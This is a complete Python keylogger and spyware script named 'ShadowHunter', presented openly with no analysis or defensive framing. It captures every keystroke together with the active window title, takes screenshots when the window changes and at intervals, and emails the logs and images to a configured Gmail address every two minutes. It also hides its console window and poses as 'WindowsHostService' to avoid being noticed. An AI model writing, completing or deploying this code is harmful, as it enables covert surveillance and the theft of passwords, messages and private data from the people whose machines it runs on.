import os
import time
import datetime
import smtplib
import threading
import random
import ctypes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

from pynput import keyboard
from PIL import ImageGrab

#CONFIGURATION 
EMAIL_ADDRESS = "your_email@gmail.com"      # Sender Gmail
EMAIL_PASSWORD = "your_16_char_app_password"        # Use App Password 
RECIPIENT_EMAIL = "your_email@gmail.com"    # Usually same as above

SEND_INTERVAL = 120          # Email every 2 minutes 
SCREENSHOT_INTERVAL = 60

FAKE_PROCESS_NAME = "WindowsHostService"
STEALTH_MODE = True         
# ================================================================
log_buffer = []
screenshots = []
current_window = "Unknown"
window_check_interval = 1.0   # Check window change every 1 second

def get_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def send_email(log_content, screenshots_list):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = f"ShadowHunter Report - {get_timestamp()}"

        body = f"""ShadowHunter Activity Report
Time: {get_timestamp()}

=== KEYSTROKES LOG ===
{log_content}
"""
        msg.attach(MIMEText(body, 'plain'))

        attached = 0
        for i, path in enumerate(screenshots_list):
            if os.path.exists(path):
                try:
                    with open(path, 'rb') as f:
                        img = MIMEImage(f.read())
                        img.add_header('Content-Disposition', f'attachment; filename=snap_{i+1}.png')
                        msg.attach(img)
                        attached += 1
                except:
                    pass
        print(f"[+] Sending email with {attached} screenshot(s)")

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            
        print(f"[+] Report sent at {get_timestamp()}")
        
        # Cleanup
        for ss in screenshots_list:
            try:
                if os.path.exists(ss):
                    os.remove(ss)
            except:
                pass
        screenshots.clear()
        
    except Exception as e:
        print(f"[-] Email error: {e}")

def get_active_window():
    try:
        if os.name == 'nt':
            import win32gui
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            return title.strip() if title else "Unknown"
    except:
        pass
    return "Unknown"

def take_screenshot(reason=""):
    try:
        screenshot = ImageGrab.grab()
        filename = f"snap_{int(time.time())}.png"
        screenshot.save(filename)
        print(f"[+] Screenshot taken ({reason}) → {filename}")
        return filename
    except Exception as e:
        print(f"[-] Screenshot failed: {e}")
        return None

def on_press(key):
    """Keystroke logging"""
    try:
        key_str = str(key).replace("'", "")
        if hasattr(key, 'char') and key.char:
            key_str = key.char

        entry = f"[{get_timestamp()}] Window: {current_window} | Key: {key_str}"
        log_buffer.append(entry)
    except:
        pass

def monitor_window_changes():
    """Dedicated thread to detect window/tab/app changes"""
    global current_window
    while True:
        try:
            new_window = get_active_window()
            if new_window != current_window and new_window != "Unknown" and new_window.strip():
                print(f"[WINDOW CHANGE] {current_window} → {new_window}")
                current_window = new_window
                ss = take_screenshot(f"Window changed: {new_window}")
                if ss:
                    screenshots.append(ss)
        except:
            pass
        time.sleep(window_check_interval)

def background_tasks():
    """Periodic screenshots + email sending"""
    while True:
        time.sleep(SEND_INTERVAL)
        
        # Occasional periodic screenshot
        if random.random() < 0.7:
            ss = take_screenshot("Periodic")
            if ss:
                screenshots.append(ss)

        if log_buffer:
            log_text = "\n".join(log_buffer[-400:])
            current_screenshots = screenshots[:]  
            threading.Thread(target=send_email, 
                           args=(log_text, current_screenshots), 
                           daemon=True).start()

def apply_stealth():
    if not STEALTH_MODE:
        return
    try:
        if os.name == 'nt':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            ctypes.windll.kernel32.SetConsoleTitleW(FAKE_PROCESS_NAME)
    except:
        pass

#MAIN 
if __name__ == "__main__":
    print(f"[+] {FAKE_PROCESS_NAME} started in {'STEALTH' if STEALTH_MODE else 'DEBUG'} mode")
    
    apply_stealth()
    
    # Start keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    
    # Start window change monitor
    threading.Thread(target=monitor_window_changes, daemon=True).start()
    
    # Start email + periodic screenshot task
    threading.Thread(target=background_tasks, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] ShadowHunter stopped.")
        if 'listener' in locals():
            listener.stop()
